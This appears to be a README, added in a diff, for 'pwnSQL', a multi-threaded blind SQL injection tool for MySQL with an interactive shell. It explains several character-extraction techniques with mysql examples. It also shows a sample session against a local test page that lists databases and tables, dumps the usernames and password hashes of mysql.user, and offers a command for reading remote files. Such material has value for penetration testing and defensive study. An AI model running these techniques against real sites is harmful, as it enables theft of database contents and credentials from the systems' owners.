@@ -1,0 +1,175 @@
+================================================================================
+pwnSQL
+======
+
+Custom blind SQL injection methods + interactive shell + multi-threads
+(Only MySQL SGDB supported)
+
+Usage
+=====
+
+$ python pwnSQL.py -h
+  -h, --help            show this help message and exit
+  --url=URL             URL of the target
+  --body=BODY           Body of the POST
+  --method=METHOD       HTTP method (GET/POST)
+  --user-agent=USER_AGENT
+                        Custom user-agent
+  --cookie=COOKIE       Custom cookies
+  --detection-type=DETECTION
+                        1: valid pattern / 0: error pattern
+  --pattern=PATTERN     Pattern to test
+  --threads=THREADS     Number of threads
+  --char-method=CHAR    Method to get chars | 1: SUBSTR / 2: MID / 3:
+                        LEFT+RIGHT / 4: LPAD+RIGHT / 5: RPAD+RIGHT / 6:LIKE
+  --decimal-method=DECIMAL
+                        Method to get decimals | 1: ASCII / 2: ORD
+
+
+*) url or body parameter should contain the term "PAYLOAD" (whitout quotes),
+   will be used to insert SQL request
+exemple : --url="http://127.0.0.1/divers/sqli_blind.php?id=4%20and%201=PAYLOAD"
+
+*) char-method
+
+	- 1 SUBSTR -
+substr(($sql$), $pos$, 1)
+mysql> select substr((select "hello"), 1, 1);
+h
+mysql> select substr((select "hello"), 2, 1);
+e
+mysql> select substr((select "hello"), 3, 1);
+l
+[...]
+
+	- 2 MID -
+Same as SUBSTR (just an alias ?)
+
+	- 3 LEFT+RIGHT -
+left(($sql$), $pos$ returns the result of $sql$ with $pos$ characters from the left
+mysql> select left((select "hello word"), 1);
+h
+mysql> select left((select "hello word"), 2);
+he
+mysql> select left((select "hello word"), 3);
+hel
+[...]
+
+right(($sql$), $pos$ returns the result of $sql$ with $pos$ characters from the right
+mysql> select right((select "hello word"), 1);
+d
+mysql> select right((select "hello word"), 2);
+rd
+mysql> select right((select "hello word"), 3);
+ord
+[...]
+
+and both left and right
+right(left(($sql$, $pos$), 1)
+mysql> select right(left((select "hello word"), 1), 1);
+h
+mysql> select right(left((select "hello word"), 2), 1);
+e
+mysql> select right(left((select "hello word"), 3), 1);
+l
+[...]
+
+the problem is we have not end exeception
+mysql> select right(left((select "hello word"), 10), 1);
+d
+mysql> select right(left((select "hello word"), 11), 1);
+d
+mysql> select right(left((select "hello word"), 12), 1);
+d
+[...]
+
+We can use as end exception the length of $sql$
+
+	- 4 LPAD+RIGHT -
+lpad($sql$, $pos$, "") does the same thing than left($sql$, $pos$) but return NULL when $pos$ > length($sql$)
+
+	- 5 RPAD+RIGHT -
+lpad and rpad are same while the third parameter is ""
+
+	- 6 LIKE -
+select ($sql$) LIKE ($search$%)
+We try each character, position by position, so the decimal method (ASCII or ORD) is not necessary.
+Because '%' and '_' are used by LIKE, these characters bug the result. To avoid this, the script bypass these characters.
+If a complete result contains the character '%' or '_' ('information_schemai'), it will be truncated from this character ('information').
+
+CHAR(37) = %
+mysql> select (select 'hello word') LIKE (CHAR(0,37));
+0
+mysql> select (select 'hello word') LIKE (CHAR(1,37));
+0
+[...]
+mysql> select (select 'hello word') LIKE (CHAR(104,37));
+1
+mysql> select (select 'hello word') LIKE (CHAR(104,0,37));
+0
+mysql> select (select 'hello word') LIKE (CHAR(104,1,37));
+0
+[...]
+mysql> select (select 'hello word') LIKE (CHAR(104,101,37));
+1
+[...]
+
+Sample
+======
+
+$ python pwnSQL.py --url="http://127.0.0.1/divers/sqli_blind.php?id=4%20and%201=PAYLOAD" --detection-type=0 --pattern="2" --threads=10 --char-method=5 --decimal-method=2
+
+        >>>>  pwnSQL  <<<<
+
+>] Analysing parameters ...
+>] Testing blind injection ...
+ + valid pattern => OK
+ + error pattern => OK
+] OK... anyway if tests are good or not, starting the shell...
+--- Functions available ---
+> databases
+> tables from [db]
+> columns from [db] [tables]
+> dump from [db] [tables] [col1] [col2] [...]
+> get [remote-file] [(optionnal) local-file]
+> [SQL command] (no multi-threading)
+> help
+> quit
+----------------------------
+>> databases
+>] 2 database(s) counted
+information_schema
+mysql
+>> tables from mysql
+>] 23 table(s) counted from db mysql
+proc
+event
+servers
+time_zone_name
+time_zone_transition
+user
+[...]
+>> columns from mysql user
+>] 39 column(s) counted from mysql.user
+Host
+User
+Drop_priv
+File_priv
+ssl_cipher
+Alter_priv
+max_updates
+Insert_priv
+Lock_tables_priv
+Create_view_priv
+Create_user_priv
+Password
+[...]
+>> dump from mysql user User Password
+>] 3 entry/ies counted from mysql.user.User
+root:*<HASH>
+root:*<HASH>
+test:*<HASH>
+>> select version()
+5.1.67-log
+>> quit
+$ 
